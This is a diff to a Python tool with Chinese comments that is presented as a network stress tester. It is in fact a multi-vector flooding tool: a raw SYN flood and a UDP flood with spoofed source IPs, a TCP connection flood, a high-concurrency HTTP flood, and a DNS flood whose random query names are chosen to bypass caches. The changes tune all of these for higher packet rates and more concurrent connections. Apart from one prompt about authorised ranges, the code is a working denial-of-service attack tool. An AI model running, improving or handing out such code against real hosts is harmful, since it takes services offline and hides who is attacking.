@@ -19,6 +19,10 @@ import threading
 import time
 from multiprocessing import Process, Queue
 
+# 单调时钟: 压测计时必须用 monotonic, 否则 NTP 校时或手动改时间会让
+# 已运行时长突变, 导致提前结束或统计速率失真
+now = time.monotonic
+
 # ============================================================
 # 常量
 # ============================================================
@@ -150,20 +154,25 @@ def ask(prompt: str, default: str = "") -> str:
     return v or default
 
 
-def ask_int(prompt: str, default: int, maximum: int = 0) -> int:
+def ask_int(prompt: str, default: int, maximum: int = 0,
+            allow_zero: bool = False) -> int:
     """带重试上限的整数输入。
-    非法输入重试 MAX_ATTEMPTS 次后自动回退默认值, 避免交互脚本卡死在死循环。
+
+    allow_zero=True 时 0 是合法值 (常用于 "0 = 不修改" 这类语义),
+    否则 0 视为非法并提示重新输入。
+    非法输入重试 MAX_ATTEMPTS 次后回退默认值, 避免交互脚本卡死。
     """
     MAX_ATTEMPTS = 5
-    for attempt in range(1, MAX_ATTEMPTS + 1):
+    low = 0 if allow_zero else 1
+    for _ in range(MAX_ATTEMPTS):
         v = ask(prompt, str(default))
         try:
             n = int(v)
         except ValueError:
             print("  ! 请输入整数")
             continue
-        if n <= 0:
-            print("  ! 请输入正整数")
+        if n < low:
+            print("  ! 请输入%s整数" % ("非负" if allow_zero else "正"))
             continue
         if maximum and n > maximum:
             print("  ! 超出允许上限 %d, 已自动修正" % maximum)
@@ -314,14 +323,17 @@ def classify_err(e) -> str:
     return "other"
 
 
-def _win_rx_bytes() -> int:
-    """Windows 下用 iphlpapi.GetIfTable 汇总所有网卡收包字节。
+def _win_rx_bytes(only_index: int = 0) -> int:
+    """Windows 下用 iphlpapi.GetIfTable 汇总网卡收包字节。
 
     MIB_IFROW 布局 (x86/x64 均为 4 字节对齐, 总长 860 字节):
         0   .. 511  wszName[256]
         512        dwIndex
         ...
         552        dwInOctets   <- 我们需要的字段
+
+    only_index 非 0 时只统计该索引的网卡, 避免把 Hyper-V/WSL/Docker
+    虚拟网卡的流量算进来。
     """
     try:
         import ctypes
@@ -343,19 +355,88 @@ def _win_rx_bytes() -> int:
             off = 4 + i * ROW
             if off + ROW > len(data):
                 break
+            idx = int.from_bytes(data[off + 512:off + 516], "little")
+            if only_index and idx != only_index:
+                continue
             total += int.from_bytes(data[off + 552:off + 556], "little")
         return total
     except Exception:
         return 0
 
 
+def _linux_default_iface() -> str:
+    """从 /proc/net/route 找出默认路由的网卡名 (Destination=0 且 Metric 最小)"""
+    best = None
+    try:
+        with open("/proc/net/route") as f:
+            next(f)  # 表头
+            for line in f:
+                parts = line.split()
+                if len(parts) < 8:
+                    continue
+                iface, dest, _gw, _flags, _ref, _use, metric, mask = parts[:8]
+                if dest != "00000000" or mask != "00000000":
+                    continue
+                m = int(metric)
+                if best is None or m < best[0]:
+                    best = (m, iface)
+    except Exception:
+        return ""
+    return best[1] if best else ""
+
+
+def _linux_iface_rx(iface: str) -> int:
+    try:
+        with open("/proc/net/dev") as f:
+            for line in f.readlines()[2:]:
+                name, _, rest = line.partition(":")
+                if name.strip() != iface:
+                    continue
+                parts = rest.split()
+                if len(parts) >= 9:
+                    return int(parts[0])
+    except Exception:
+        pass
+    return 0
+
+
+def _win_default_iface_index() -> int:
+    """用 GetBestInterface 找出访问公网时实际使用的网卡索引"""
+    try:
+        import ctypes
+        from ctypes import wintypes
+        iphlpapi = ctypes.WinDLL("iphlpapi.dll")
+        # 8.8.8.8 只用来问路由, 不会真的发流量
+        dest = struct.unpack("!I", socket.inet_aton("8.8.8.8"))[0]
+        idx = wintypes.DWORD(0)
+        if iphlpapi.GetBestInterface(wintypes.DWORD(dest), ctypes.byref(idx)) == 0:
+            return int(idx.value)
+    except Exception:
+        pass
+    return 0
+
+
 def iface_rx_bytes() -> int:
     """统计本机收包总量(字节)。
-    Linux 读 /proc/net/dev; Windows 走 iphlpapi; 取不到时返回 0。
+
+    优先只统计"通往目标的那块网卡": 在 Docker/多网卡环境里,
+    docker0、br-*、veth 的流量会把"回收 Mbps"算得虚高。
+    找不到默认路由时退回全量统计。
+
     注意: Windows 计数器是 32 位, 会在 4GiB 处回绕, 调用方需处理负增量。
     """
     if IS_WIN:
+        idx = _win_default_iface_index()
+        if idx:
+            v = _win_rx_bytes(only_index=idx)
+            if v:
+                return v
         return _win_rx_bytes()
+    iface = _linux_default_iface()
+    if iface:
+        v = _linux_iface_rx(iface)
+        if v:
+            return v
     total = 0
     try:
         with open("/proc/net/dev") as f:
@@ -480,21 +561,6 @@ def build_udp(src: str, dst: str, sport: int, dport: int, payload: bytes) -> byt
     return struct.pack("!HHHH", sport, dport, ln, ck) + payload
 
 
-def fd_limit() -> int:
-    """当前进程可打开的 fd 上限 (Linux/macOS)"""
-    try:
-        import resource
-        soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
-        return int(soft)
-    except Exception:
-        try:
-            import subprocess
-            out = subprocess.check_output(["ulimit", "-n"], shell=False)
-            return int(out.decode().strip())
-        except Exception:
-            return 0
-
-
 def resolve_host(host: str, port: int) -> str:
     """解析域名 -> IP, 失败则原样返回
     压测时把 IP 缓存下来, 避免每次连接都走 DNS 解析线程池
@@ -511,7 +577,7 @@ def resolve_host(host: str, port: int) -> str:
 
 def preflight(host: str, port: int, use_tls: bool, ssl_ctx=None, sni=None):
     """启动前连通性自检, 返回 (是否通过, 说明)"""
-    t0 = time.time()
+    t0 = now()
     try:
         ip = resolve_host(host, port)
     except Exception as e:
@@ -520,7 +586,7 @@ def preflight(host: str, port: int, use_tls: bool, ssl_ctx=None, sni=None):
         s = socket.create_connection((ip, port), timeout=5)
     except Exception as e:
         return False, "TCP 连接失败 (%s:%d) : %s" % (host, port, e)
-    rtt = (time.time() - t0) * 1000
+    rtt = (now() - t0) * 1000
     try:
         if use_tls:
             ctx = ssl_ctx or ssl.create_default_context()
@@ -538,6 +604,54 @@ def preflight(host: str, port: int, use_tls: bool, ssl_ctx=None, sni=None):
         except Exception:
             pass
         return False, "TLS 握手失败: %s" % e
+
+
+def preflight_udp(host: str, port: int, timeout: float = 3.0):
+    """UDP 连通性自检。DNS 服务器通常只开 UDP/53,
+    用 TCP 探测会误报失败, 所以单独走 UDP + 真实 DNS 查询。
+    返回 (是否通过, 说明)
+    """
+    t0 = now()
+    try:
+        ip = resolve_host(host, port)
+    except Exception as e:
+        return False, "地址解析失败: %s" % e
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(timeout)
+    except Exception as e:
+        return False, "UDP socket 创建失败: %s" % e
+    try:
+        pkt, tid = build_dns_query()
+        try:
+            s.sendto(pkt, (ip, port))
+        except Exception as e:
+            return False, "UDP 发送失败 (%s:%d): %s" % (host, port, e)
+        # DNS 无响应是常态 (可能被过滤), 发送成功即视为链路可达
+        try:
+            data = s.recv(4096)
+            rtt = (now() - t0) * 1000
+            if len(data) >= 12:
+                if struct.unpack("!H", data[:2])[0] == tid:
+                    return True, "DNS 查询得到应答  RTT=%.1fms  %d 字节" % (
+                        rtt, len(data))
+                return True, "收到 UDP 应答 (事务ID不匹配) %d 字节" % len(data)
+            return True, "收到 %d 字节应答" % len(data)
+        except socket.timeout:
+            return True, ("UDP 已发出但 %.0fs 内无应答 "
+                          "(可能只做过滤, 压测仍可进行)" % timeout)
+        except OSError as e:
+            # Windows 上收到 ICMP 端口不可达会以 ECONNRESET 形式抛出,
+            # 这说明端口确实没开, 属于真实失败而非探测方法的问题。
+            en = getattr(e, "errno", None)
+            if en in (errno.ECONNRESET, errno.ECONNREFUSED):
+                return False, "UDP 端口不可达 (收到 ICMP 不可达, 端口未开放)"
+            return False, "UDP 接收失败: %s" % e
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
 
 
 # ============================================================
@@ -582,7 +696,7 @@ class Stats:
 def vec_syn(target, port, duration, workers, size, spoof, stats):
     """原始 SYN 洪水 — 灌满目标 SYN 队列形成半连接"""
     stop = threading.Event()
-    end = time.time() + duration
+    end = now() + duration
     lip = local_ip()
 
     def run():
@@ -598,7 +712,7 @@ def vec_syn(target, port, duration, workers, size, spoof, stats):
             print(msg)
             return
         pad = b"\x00" * max(0, size - 40)
-        while not stop.is_set() and time.time() < end:
+        while not stop.is_set() and now() < end:
             batch = []
             for _ in range(64):
                 src = rand_ip() if spoof else lip
@@ -625,24 +739,31 @@ def vec_syn(target, port, duration, workers, size, spoof, stats):
 def vec_udp(target, port, duration, workers, size, spoof, stats):
     """UDP 洪水 — 带宽/报文队列淹没"""
     stop = threading.Event()
-    end = time.time() + duration
+    end = now() + duration
+    # 本机出口 IP 只解析一次。放在热循环里会每包建一次 socket,
+    # 48 包的批次就是 48 次 connect/getsockname, 直接把发包率拖垮。
+    lip = local_ip()
 
     def run():
-        try:
-            s = make_raw_socket()
-            raw = True
-            if spoof and IS_WIN:
-                # Windows 不允许原始 UDP 伪造源地址, 会直接丢包
-                raise OSError("Windows 不支持伪造源 IP 的原始 UDP 发包")
-        except OSError:
+        # 先判断平台限制, 再建套接字。否则 Windows + spoof 时
+        # 会先创建 raw socket 再抛异常, 导致句柄泄漏。
+        want_raw = not (spoof and IS_WIN)
+        if not want_raw:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             raw = False
+        else:
+            try:
+                s = make_raw_socket()
+                raw = True
+            except OSError:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                raw = False
         payload = os.urandom(max(1, size))
-        while not stop.is_set() and time.time() < end:
+        while not stop.is_set() and now() < end:
             try:
                 if raw:
                     for _ in range(48):
-                        src = rand_ip() if spoof else local_ip()
+                        src = rand_ip() if spoof else lip
                         pkt = (build_ip(src, target, 17, 8 + len(payload))
                                + build_udp(src, target, random.randint(1024, 65535),
                                            port, payload))
@@ -667,11 +788,14 @@ def vec_udp(target, port, duration, workers, size, spoof, stats):
 def vec_tcp(target, port, duration, workers, size, spoof, stats):
     """TCP 连接洪水 — 耗尽 accept 队列与 fd 表"""
     stop = threading.Event()
-    end = time.time() + duration
+    end = now() + duration
     payload = os.urandom(max(1, size))
 
     def run():
-        while not stop.is_set() and time.time() < end:
+        while not stop.is_set() and now() < end:
+            # 每次循环都是一次建连尝试, 必须计数, 否则报告里
+            # "建连尝试: 0 / 成功连接: N" 看起来像 bug
+            stats.add(attempts=1)
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(0.8)
@@ -681,8 +805,8 @@ def vec_tcp(target, port, duration, workers, size, spoof, stats):
                     s.sendall(payload)
                 time.sleep(random.uniform(0.05, 0.3))
                 s.close()
-            except OSError:
-                stats.add(errs=1)
+            except OSError as e:
+                stats.add(errs=1, kind=classify_err(e))
 
     ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
     for t in ts:
@@ -704,9 +828,27 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
     """
     import asyncio
 
+    def _quiet_exc(loop, context):
+        """屏蔽对端 RST 产生的无害回调噪音, 其余异常照常上报。
+
+        Windows Proactor 在连接被重置时会于 connection_lost 里抛
+        ConnectionResetError, 这属于正常现象, 不应该刷屏干扰统计面板。
+        """
+        exc = context.get("exception")
+        if isinstance(exc, (ConnectionResetError, ConnectionAbortedError,
+                            BrokenPipeError)):
+            return
+        if isinstance(exc, OSError) and getattr(exc, "errno", None) in (
+                10053, 10054, 104, 32):
+            return
+        loop.default_exception_handler(context)
+
     async def main():
-        end = time.time() + duration
-        sem = asyncio.Semaphore(workers)
+        try:
+            asyncio.get_running_loop().set_exception_handler(_quiet_exc)
+        except Exception:
+            pass
+        end = now() + duration
         hdr_host = host_header or target
         # 预解析域名: 避免每条连接都走 getaddrinfo 线程池 (默认仅 8 线程, 会成为瓶颈)
         try:
@@ -717,6 +859,22 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
         # 握手并发闸门: 50000 条 TLS 握手同时打, 本机 CPU 会先炸
         hs_limit = max(64, min(workers, cfg_hs_limit))
         hs_sem = asyncio.Semaphore(hs_limit)
+        # 注: 不再用 Semaphore(workers) 限流协程数 —— 协程总数本身就等于
+        # workers, 这个信号量恒不阻塞, 属于纯开销。真正的并发上限由
+        # 下方的 Task 数量直接决定, 并在建 Task 前做过量提示。
+        # 分批启动, 避免一瞬间堆积过多待调度 Task。
+        # 步长按并发规模自适应: 小并发一次拉完(短 duration 不至于爬升太慢),
+        # 大并发分 ~20 批, 让前置连接先跑起来吸收启动尖峰。
+        SPAWN_STEP = max(512, workers // 20)
+
+        # POST/PUT 的请求体预生成一个小池子循环复用。
+        # 每请求调 os.urandom 在 insane 档是纯 CPU 开销, 且完全没必要 ——
+        # 压测关心的是字节量和速率, 不需要每次都不同。
+        if method in ("POST", "PUT") and size > 0:
+            pool_n = 8 if size <= 65536 else 2
+            body_pool = [os.urandom(size) for _ in range(pool_n)]
+        else:
+            body_pool = []
 
         async def read_response(r, deadline):
             """读取一条完整 HTTP 响应, 防止半读导致 TCP 流错位。
@@ -730,7 +888,7 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
             buf = b""
             # ---- 读头部 ----
             while b"\r\n\r\n" not in buf:
-                remain = deadline - time.time()
+                remain = deadline - now()
                 if remain <= 0:
                     return "timeout", len(buf)
                 try:
@@ -763,27 +921,91 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                     chunked = True
             # ---- 读报文 ----
             if chunked:
-                while not rest.endswith(b"\r\n0\r\n\r\n") and b"\r\n0\r\n\r\n" not in rest:
-                    remain = deadline - time.time()
-                    if remain <= 0:
-                        return "timeout", total
+                # 逐块解析: 读 "十六进制长度\r\n" + 数据 + "\r\n",
+                # 遇到长度为 0 的块结束。不能用字节串搜索终止符,
+                # 否则响应体里恰好含 "\r\n0\r\n\r\n" 时会提前收尾。
+                body = bytearray(rest)
+                pos = 0          # 已消费到 body 的位置
+                while True:
+                    # 找到当前块的尺寸行
+                    while True:
+                        nl = body.find(b"\r\n", pos)
+                        if nl != -1:
+                            break
+                        remain = deadline - now()
+                        if remain <= 0:
+                            return "timeout", total
+                        try:
+                            chunk = await asyncio.wait_for(
+                                r.read(4096), timeout=remain)
+                        except asyncio.TimeoutError:
+                            return "timeout", total
+                        except (OSError, ssl.SSLError):
+                            return "eof", total
+                        if not chunk:
+                            return "eof", total
+                        body += chunk
+                        total += len(chunk)
+                        if len(body) > 4 * 1024 * 1024:
+                            return "bad", total
+                    size_line = bytes(body[pos:nl])
+                    # 去掉 chunk extension (;name=value)
+                    semi = size_line.find(b";")
+                    if semi != -1:
+                        size_line = size_line[:semi]
                     try:
-                        chunk = await asyncio.wait_for(r.read(4096), timeout=remain)
-                    except asyncio.TimeoutError:
-                        return "timeout", total
-                    except (OSError, ssl.SSLError):
-                        return "eof", total
-                    if not chunk:
-                        return "eof", total
-                    rest += chunk
-                    total += len(chunk)
-                    if len(rest) > 4 * 1024 * 1024:
+                        csize = int(size_line.strip(), 16)
+                    except ValueError:
                         return "bad", total
-                return "ok", total
+                    pos = nl + 2
+                    if csize == 0:
+                        # 末块: 后面可能跟 trailer, 读到空行即可
+                        while True:
+                            nl2 = body.find(b"\r\n", pos)
+                            if nl2 == pos:
+                                return "ok", total
+                            if nl2 != -1:
+                                pos = nl2 + 2
+                                continue
+                            remain = deadline - now()
+                            if remain <= 0:
+                                return "ok", total
+                            try:
+                                chunk = await asyncio.wait_for(
+                                    r.read(4096), timeout=remain)
+                            except (asyncio.TimeoutError, OSError, ssl.SSLError):
+                                return "ok", total
+                            if not chunk:
+                                return "ok", total
+                            body += chunk
+                            total += len(chunk)
+                    # 确保块数据 + 结尾 \r\n 都在缓冲里
+                    while len(body) < pos + csize + 2:
+                        remain = deadline - now()
+                        if remain <= 0:
+                            return "timeout", total
+                        try:
+                            chunk = await asyncio.wait_for(
+                                r.read(4096), timeout=remain)
+                        except asyncio.TimeoutError:
+                            return "timeout", total
+                        except (OSError, ssl.SSLError):
+                            return "eof", total
+                        if not chunk:
+                            return "eof", total
+                        body += chunk
+                        total += len(chunk)
+                        if len(body) > 4 * 1024 * 1024:
+                            return "bad", total
+                    pos += csize + 2
+                    # 回收已消费的前缀, 避免缓冲无限增长
+                    if pos > 65536:
+                        del body[:pos]
+                        pos = 0
             if clen >= 0:
                 need = clen - len(rest)
                 while need > 0:
-                    remain = deadline - time.time()
+                    remain = deadline - now()
                     if remain <= 0:
                         return "timeout", total
                     try:
@@ -801,21 +1023,24 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
             # 没有长度信息: 只能按 EOF 判断, 或者读一次就返回
             return "ok", total
 
-        async def one_request(r, w):
+        async def one_request(r, w, ua=None, path=None):
             hdr = {
                 "Host": hdr_host,
-                "User-Agent": random.choice(UA_POOL),
+                "User-Agent": ua or random.choice(UA_POOL),
                 "Accept": "*/*",
                 "Accept-Language": "zh-CN,zh;q=0.9",
                 "Accept-Encoding": "identity",
                 "Cache-Control": "no-cache",
                 "Connection": "keep-alive" if reuse else "close",
             }
-            body = os.urandom(size) if method in ("POST", "PUT") and size else b""
+            # 从预生成池里随机取, 避免每个请求都调 os.urandom —
+            # insane 档 POST 大 body 时, 生成随机数会成为纯 CPU 瓶颈
+            body = random.choice(body_pool) if body_pool else b""
             if body:
                 hdr["Content-Type"] = "application/octet-stream"
                 hdr["Content-Length"] = str(len(body))
-            req = ("%s %s HTTP/1.1\r\n" % (method, random.choice(paths))).encode()
+            req = ("%s %s HTTP/1.1\r\n"
+                   % (method, path or random.choice(paths))).encode()
             for k, v in hdr.items():
                 req += ("%s: %s\r\n" % (k, v)).encode()
             req += b"\r\n" + body
@@ -834,7 +1059,7 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                 except (asyncio.TimeoutError, OSError, ssl.SSLError):
                     pass
                 return "ok", 0
-            deadline = time.time() + resp_timeout
+            deadline = now() + resp_timeout
             status, nbytes = await read_response(r, deadline)
             if nbytes:
                 stats.add(rbytes=nbytes)
@@ -874,82 +1099,173 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                     return None, None, k
 
         async def conn():
-            async with sem:
-                while time.time() < end:
-                    r, w, kind = await do_connect()
-                    if r is None:
-                        # fd/端口耗尽属于本地资源瓶颈, 重试只会空转烧 CPU,
-                        # 必须拉长退避, 让已建立的连接把活干完
-                        if kind in ("fd_exhausted", "port_exhausted"):
-                            await asyncio.sleep(random.uniform(0.5, 1.5))
-                        else:
-                            await asyncio.sleep(random.uniform(0.05, 0.3))
-                        continue
-                    stats.add(conns=1)
-                    try:
-                        while time.time() < end:
-                            status, _nb = await one_request(r, w)
-                            # 状态异常 -> 关闭重连, 避免半读造成流错位
-                            if status in ("timeout", "eof", "bad", "write_err"):
-                                stats.add(errs=1, kind="resp_" + status)
-                                break
-                            if not reuse:
-                                break
-                            if reuse_jitter > 0:
-                                await asyncio.sleep(
-                                    random.uniform(0, reuse_jitter))
-                    except (OSError, ssl.SSLError, asyncio.IncompleteReadError) as e:
-                        stats.add(errs=1, kind=classify_err(e))
-                    finally:
-                        try:
-                            w.close()
-                        except Exception:
-                            pass
-                    # 关键: 连接断了要重连, 不能让协程永久退出。
-                    # 否则长时间压测下 worker 会陆续死光, 后半段 pps 假性归零。
-                    if not reuse:
-                        await asyncio.sleep(random.uniform(0, 0.02))
+            while now() < end:
+                # 每条连接固定 UA 与路径: 更贴近真实客户端(同一会话 UA 不变),
+                # 也省掉每请求一次 random.choice 的全局锁竞争
+                ua = random.choice(UA_POOL)
+                path = random.choice(paths)
+                r, w, kind = await do_connect()
+                if r is None:
+                    # fd/端口耗尽属于本地资源瓶颈, 重试只会空转烧 CPU,
+                    # 必须拉长退避, 让已建立的连接把活干完
+                    if kind in ("fd_exhausted", "port_exhausted"):
+                        await asyncio.sleep(random.uniform(0.5, 1.5))
                     else:
-                        await asyncio.sleep(random.uniform(0, 0.05))
+                        await asyncio.sleep(random.uniform(0.05, 0.3))
                     continue
+                stats.add(conns=1)
+                try:
+                    while now() < end:
+                        status, _nb = await one_request(r, w, ua, path)
+                        # 状态异常 -> 关闭重连, 避免半读造成流错位
+                        if status in ("timeout", "eof", "bad", "write_err"):
+                            stats.add(errs=1, kind="resp_" + status)
+                            break
+                        if not reuse:
+                            break
+                        if reuse_jitter > 0:
+                            await asyncio.sleep(random.uniform(0, reuse_jitter))
+                except (OSError, ssl.SSLError, asyncio.IncompleteReadError) as e:
+                    stats.add(errs=1, kind=classify_err(e))
+                finally:
+                    try:
+                        w.close()
+                    except Exception:
+                        pass
+                # 关键: 连接断了要重连, 不能让协程永久退出。
+                # 否则长时间压测下 worker 会陆续死光, 后半段 pps 假性归零。
+                # reuse=False 走的是"每请求一次建连"模式, 间隔要短才压得出
+                # 真实建连速率; reuse=True 用较长间隔避免空转抢 CPU。
+                await asyncio.sleep(random.uniform(0, 0.05 if reuse else 0.005))
+
+        # 分批创建 Task: 50000 个协程一次性全堆进事件循环会造成启动瞬间的
+        # 内存尖峰和调度拥堵, 分批拉起可以让前置连接先跑起来。
+        tasks = []
+        started = 0
+        while started < workers and now() < end:
+            n = min(SPAWN_STEP, workers - started)
+            for _ in range(n):
+                tasks.append(asyncio.create_task(conn()))
+            started += n
+            if started < workers:
+                await asyncio.sleep(0.02)
 
         # 不再静默吞异常: 协程崩溃必须暴露到错误分类里,
         # 否则像 NameError 这种 bug 会藏在 gather 里跑完全程还显示 0 请求
-        results = await asyncio.gather(*[conn() for _ in range(workers)],
-                                       return_exceptions=True)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
         for r in results:
             if isinstance(r, asyncio.CancelledError):
                 continue
             if isinstance(r, BaseException):
                 stats.add(errs=1, kind="task_crash:%s" % type(r).__name__)
 
-    # Windows 默认 Proactor 在大量连接被 RST 时会在 connection_lost 回调里
-    # 抛 ConnectionResetError 噪音; 切到 Selector 更干净且行为与 Linux 一致
+    # 关键: 绝对不能用 WindowsSelectorEventLoopPolicy。
+    # Windows 的 select() 受 FD_SETSIZE=512 限制, 切到 Selector 等于把并发
+    # 上限锁在 ~500 条连接, 超过就 ValueError: too many file descriptors。
+    # 保持默认 Proactor(IOCP) 才能支撑上万并发。
+    # Proactor 在对端 RST 时会往 connection_lost 里抛 ConnectionResetError,
+    # 用自定义异常处理器静音即可, 不必更换事件循环。
     if IS_WIN:
         try:
-            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
         except (AttributeError, DeprecationWarning):
             pass
 
     asyncio.run(main())
 
 
-def vec_dns(target, port, duration, workers, size, spoof, stats):
-    """DNS 查询洪水 — 针对 DNS 服务器的解析压测"""
+def dns_random_qname():
+    """构造一个随机域名, 并返回 (wire 格式 qname, 可读字符串)。
+
+    固定 qname 会被递归解析器和上游缓存命中, 测出来的是缓存性能而非
+    解析能力; 每包换域名才能真正压到递归解析路径。
+    """
+    labels = random.randint(1, 3)
+    parts = []
+    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+    for _ in range(labels):
+        n = random.randint(4, 12)
+        parts.append("".join(random.choice(alphabet) for _ in range(n)))
+    parts.append(random.choice(("com", "net", "org", "cn", "io", "xyz")))
+    name = ".".join(parts)
+    wire = b""
+    for lab in parts:
+        b = lab.encode()
+        wire += bytes((len(b),)) + b
+    return wire + b"\x00", name
+
+
+def build_dns_query():
+    """构造一条随机 DNS 查询报文, 返回 (报文, 事务ID)"""
+    qname, _ = dns_random_qname()
+    tid = random.randint(1, 65535)
+    qtype = random.choice((1, 1, 1, 28, 15, 16, 2))  # A 偏多, 兼顾 AAAA/MX/TXT/NS
+    # QR=0 OPCODE=0 RD=1
+    hdr = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
+    return hdr + qname + struct.pack("!HH", qtype, 1), tid
+
+
+def vec_dns(target, port, duration, workers, size, spoof, stats,
+            wait_response=True, randomize=True, drain_every=32):
+    """DNS 查询洪水 — 随机 qname/qtype, 可选统计响应。
+
+    randomize     : False 时退回固定 qname (仅用于对比缓存命中场景)
+    wait_response : True 时读取响应并统计 rbytes/超时, 能反映解析失败
+    drain_every   : 每发多少包排空一次响应队列。
+                    调小(4~8)能更及时读回包, 响应率统计更准, 但吞吐略降;
+                    调大可提高发包密度。默认 32。
+    """
     stop = threading.Event()
-    end = time.time() + duration
+    end = now() + duration
+    fixed_q = b"\x0bstress-test\x07example\x03com\x00"
 
     def run():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        q = b"\x0bstress-test\x07example\x03com\x00"
-        pkt = struct.pack("!HHHHHH", random.randint(1, 65535), 0x0100, 1, 0, 0, 0) + q
-        while not stop.is_set() and time.time() < end:
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
+        except OSError:
+            pass
+        if wait_response:
+            # 0.05s 对 RTT>50ms 的服务器会全部误判为无应答,
+            # 放宽到 0.2s 同时兼顾高吞吐下的排空效率。
+            s.settimeout(0.2)
+        batch = max(1, int(drain_every))
+        while not stop.is_set() and now() < end:
             try:
-                for _ in range(32):
+                for _ in range(batch):
+                    if randomize:
+                        pkt, tid = build_dns_query()
+                    else:
+                        # tid 同样要赋值: 两个分支保持一致,
+                        # 避免以后有人在此之后引用 tid 时 NameError
+                        tid = random.randint(1, 65535)
+                        pkt = (struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
+                               + fixed_q)
                     s.sendto(pkt, (target, port))
-                stats.add(pkts=32, nbytes=32 * len(pkt))
-            except OSError:
-                stats.add(errs=1)
+                stats.add(pkts=batch, nbytes=batch * len(pkt))
+            except OSError as e:
+                stats.add(errs=1, kind=classify_err(e))
+                continue
+            if wait_response:
+                # 排空响应队列, 统计真实回包量
+                got = 0
+                while True:
+                    try:
+                        data = s.recv(4096)
+                    except socket.timeout:
+                        break
+                    except OSError as e:
+                        stats.add(errs=1, kind=classify_err(e))
+                        break
+                    if not data:
+                        break
+                    got += len(data)
+                    if got > 512 * 1024:
+                        break
+                if got:
+                    stats.add(rbytes=got)
+                else:
+                    stats.add(errs=1, kind="dns_no_reply")
         s.close()
 
     ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
@@ -1015,7 +1331,10 @@ def worker(cfg, wid, q):
                      reuse_jitter=float(cfg.get("reuse_jitter", 0.01)))
         elif m == "dns":
             vec_dns(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
-                    cfg["spoof"], st)
+                    cfg["spoof"], st,
+                    wait_response=cfg.get("dns_wait", True),
+                    randomize=cfg.get("dns_random", True),
+                    drain_every=cfg.get("dns_drain_every", 32))
         elif m == "mix":
             h = max(1, cfg["duration"] / 2)
             ts = [
@@ -1167,8 +1486,11 @@ def collect_config() -> dict:
             print("      超出部分会全部 EMFILE 失败，白白占满 CPU。")
             print("      解决: ulimit -n 1048576  或  并发降到 %s 以内"
                   % format(cap, ","))
-            newt = ask_int("调整并发数 (0=不改, 强制用原值)", cap)
-            if newt > 0:
+            newt = ask_int("调整并发数 (0=不改, 直接回车=%d)" % cap, cap,
+                           allow_zero=True)
+            if newt == 0:
+                print("  [*] 保持原并发 %d (可能大量 EMFILE)" % threads)
+            else:
                 threads = newt
     spoof = False
 
@@ -1225,6 +1547,27 @@ def collect_config() -> dict:
     else:
         conn_timeout = 8
 
+    dns_wait = True
+    dns_random = True
+    if mode == "dns":
+        print(hr("DNS 选项"))
+        dns_random = ask_yn(
+            "随机化查询域名? (Y=每包不同域名, 能压到递归解析; N=固定域名只测缓存)", True)
+        dns_wait = ask_yn(
+            "读取响应? (Y=统计回包与无响应数, 反映真实解析成败)", True)
+        if dns_wait:
+            print("  [i] 高吞吐下响应统计可能偏低 (排空窗口有限), "
+                  "判读时以「发出 pps」和「收到数据」为准")
+        if not dns_random:
+            print("  [!] 固定域名会被缓存命中, 测出的不是递归解析能力")
+        if dns_wait:
+            dns_drain_every = ask_int(
+                "每批发多少包排空一次响应 (4-8 响应率更准, 32 吞吐更高)", 32)
+        else:
+            dns_drain_every = 32
+    else:
+        dns_drain_every = 32
+
     if mode in ("syn", "udp"):
         spoof = ask_yn("源 IP 地址伪造? (仅限授权靶场 / 内网)", False)
 
@@ -1234,7 +1577,9 @@ def collect_config() -> dict:
                use_tls=use_tls, tls_verify=tls_verify, tls_version=tls_version,
                alpn=alpn, cipher=cipher, sni=sni, host_header=host_header,
                reuse=reuse, hs_limit=hs_limit, conn_timeout=conn_timeout,
-               resp_timeout=resp_timeout, wait_response=wait_response)
+               resp_timeout=resp_timeout, wait_response=wait_response,
+               dns_wait=dns_wait, dns_random=dns_random,
+               dns_drain_every=dns_drain_every)
 
     print(hr("配置确认"))
     print("  目标      : %s://%s:%d" % ("https" if use_tls else "http", host, port))
@@ -1254,24 +1599,34 @@ def collect_config() -> dict:
                  else "发射后不管 (仅周期性排空, 速率不受RTT限制)"))
     if is_web:
         print("  建连超时  : %d 秒" % conn_timeout)
+    if mode == "dns":
+        print("  查询域名  : %s" % ("每包随机 (压递归解析)" if dns_random
+                                    else "固定 example.com (仅测缓存)"))
+        print("  读取响应  : %s" % ("是" if dns_wait else "否 (只看发出量)"))
     print("  路径      : %s" % ", ".join(paths))
     print("  本机出口  : %s" % local_ip())
     print(hr())
 
-    # ---- 连通性预检: 避免像上次那样跑 12 秒才发现目标根本连不上 ----
-    if is_web or mode == "dns":
+    # ---- 连通性预检 ----
+    if mode == "dns":
+        print(hr("连通性预检 (UDP)"))
+        ok, msg = preflight_udp(host, port)
+        print("  预检结果  : %s" % ("通过 - " + msg if ok else "失败 - " + msg))
+        if not ok:
+            print("  [!] 目标 UDP 端口不可达, 继续压测大概率全失败。")
+            if not ask_yn("仍要继续?", False):
+                print("已取消。")
+                sys.exit(0)
+        print(hr())
+    elif is_web:
